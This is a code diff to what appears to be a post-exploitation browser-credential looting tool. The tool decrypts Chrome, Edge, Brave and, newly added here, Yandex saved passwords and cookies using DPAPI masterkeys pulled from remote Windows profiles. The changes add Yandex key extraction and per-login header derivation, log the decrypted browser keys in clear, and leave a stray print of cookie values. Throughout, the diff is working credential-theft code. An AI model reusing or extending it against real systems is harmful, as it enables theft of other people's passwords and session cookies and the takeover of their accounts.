@@ -1,6 +1,7 @@
 import base64
 from Cryptodome.Cipher import AES, ChaCha20_Poly1305
 from binascii import hexlify
+import hashlib
 import json
 import logging
 import tempfile
@@ -144,19 +145,19 @@ class LoginData:
             f"[{self.browser.upper()}] {self.url} - {self.username}:{self.password}"
         )
 
-    def decrypt(self, aeskey:bytes, app_bound_key:bytes):
+    def decrypt(self, aeskey:bytes, app_bound_key:bytes, header:bytes = b''):
         try:
             if self.encrypted_password[:3] == b"v20":
                 if app_bound_key is not None:
                     self.password = decrypt_chrome_password(
-                    self.encrypted_password, app_bound_key
+                    self.encrypted_password, app_bound_key, header
                     ).decode("latin-1")
             else:
                 self.password = decrypt_chrome_password(
-                self.encrypted_password, aeskey
+                self.encrypted_password, aeskey, header
                 ).decode("latin-1")
         except Exception as e:
-            logging.debug(f"Could not decrypt chrome password: {e}")
+            logging.debug(f"Could not decrypt password: {e}")
         return self.password is not None
 
 class Cookie:
@@ -206,13 +207,14 @@ class Cookie:
                 if app_bound_key is not None:
                     self.cookie_value = decrypt_chrome_password(
                     self.encrypted_cookie_value, app_bound_key
-                    ).decode("utf-8")
+                    )[32:].decode("utf-8")
             else:
                 self.cookie_value = decrypt_chrome_password(
                 self.encrypted_cookie_value, aeskey
-                ).decode("utf-8")
+                )[32:].decode("utf-8")
         except Exception as e:
-            logging.debug(f"Could not decrypt chrome password: {e}")
+            print(self.cookie_value)
+            logging.debug(f"Could not decrypt cookies: {e}")
 
         return self.cookie_value is not None
 
@@ -238,7 +240,6 @@ class GoogleRefreshToken:
     def decrypt(self, aeskey) -> bool:
         self.token = decrypt_chrome_password(self.encrypted_token, aeskey).decode("utf-8")
         return self.token is not None
-
 
 class BrowserTriage(Triage):
     user_google_chrome_generic_login_path = {
@@ -268,10 +269,20 @@ class BrowserTriage(Triage):
             "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Network\\Cookies",
         ],
     }
+    user_yandex_generic_login_path = {
+        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State",
+        "loginDataPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Ya Passman Data",
+        "webDataPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Web Data",
+        "cookiesDataPath": [
+            "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Cookies",
+            "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Network\\Cookies",
+        ],
+    }
     user_generic_chrome_paths = {
         "google chrome": user_google_chrome_generic_login_path,
         "msedge": user_msedge_generic_login_path,
         "brave": user_brave_generic_login_path,
+        "yandex": user_yandex_generic_login_path,
     }
 
     share = "C$"
@@ -358,15 +369,14 @@ class BrowserTriage(Triage):
                     blob = base64.b64decode(aesStateKey_json["os_crypt"]["encrypted_key"])
                     aeskey_obj = AesStateKey(blob)
                     if aeskey_obj.decrypt(masterkeys=self.masterkeys):
-                        logging.debug("AesStateKey decrypted!")
                         aeskey = aeskey_obj.aeskey
-
+                        logging.debug(f"AesStateKey decrypted: {aeskey}")
                     if "app_bound_encrypted_key" in aesStateKey_json["os_crypt"]:
                         app_bound_blob = base64.b64decode(aesStateKey_json["os_crypt"]["app_bound_encrypted_key"])
                         app_bound_key_obj = AppBoundKey(app_bound_blob)
                         if app_bound_key_obj.decrypt(masterkeys=self.masterkeys, cng_chromekey=cng_chromekey):
-                            logging.debug("AppBoundKey decrypted!")
                             app_bound_key = app_bound_key_obj.app_bound_key
+                            logging.debug(f"AppBoundKey decrypted: {app_bound_key}")
                     profiles = aesStateKey_json["profile"]["profiles_order"]
                 except KeyError as e:
                     logging.debug(f"Key not found! {e!r}")
@@ -391,12 +401,41 @@ class BrowserTriage(Triage):
                     fh.seek(0)
                     db = sqlite3.connect(fh.name)
                     cursor = db.cursor()
+                    yandex_key = None
+
+                    if browser == "yandex":
+                        # from https://github.com/akhomlyuk/Ya_Decrypt
+                        yandex_signature = b"\x08\x01\x12\x20"
+                        cursor.execute("SELECT value FROM meta WHERE key='local_encryptor_data'")
+                        blob = cursor.fetchone()[0]
+                        ind = blob.find(b"v10")
+                        encrypted_data = blob[ind:ind + 99]
+                        decrypted_data = decrypt_chrome_password(encrypted_data, aeskey)
+                        if not decrypted_data or not decrypted_data.startswith(yandex_signature):
+                            continue
+                        yandex_key = decrypted_data[len(yandex_signature):len(yandex_signature) + 32]
+                        logging.debug(f"Yandex browser local_encryptor_data key retrieved: {yandex_key}")
+                    
                     query = cursor.execute(
-                        "SELECT action_url, username_value, password_value FROM logins"
+                        "SELECT origin_url, username_value, password_value, username_element, password_element, signon_realm FROM logins"
                     )
                     lines = query.fetchall()
                     if len(lines) > 0:
-                        for url, username, encrypted_password in lines:
+                        for url, username, encrypted_password, username_element, password_element, signon_realm in lines:
+                            if encrypted_password == b"":
+                                continue
+                            
+                            if browser == "yandex":
+                                header = hashlib.sha1(( url + 
+                                        "\x00" + username_element +
+                                        "\x00" + username +
+                                        "\x00" + password_element +
+                                        "\x00" + signon_realm).encode("utf-8")
+                                ).digest()
+                                encrypted_password = b"v10"+encrypted_password
+                            else:
+                                header = b''
+
                             login_data = LoginData(
                                 winuser=user,
                                 browser=browser,
@@ -404,7 +443,8 @@ class BrowserTriage(Triage):
                                 username=username,
                                 encrypted_password=encrypted_password,
                             )
-                            if login_data.decrypt(aeskey=aeskey, app_bound_key=app_bound_key):
+                            
+                            if login_data.decrypt(aeskey=aeskey if yandex_key is None else yandex_key, app_bound_key=app_bound_key, header=header):
                                 credentials.append(login_data)
                                 if self.per_loot_callback is not None:
                                     self.per_loot_callback(login_data)
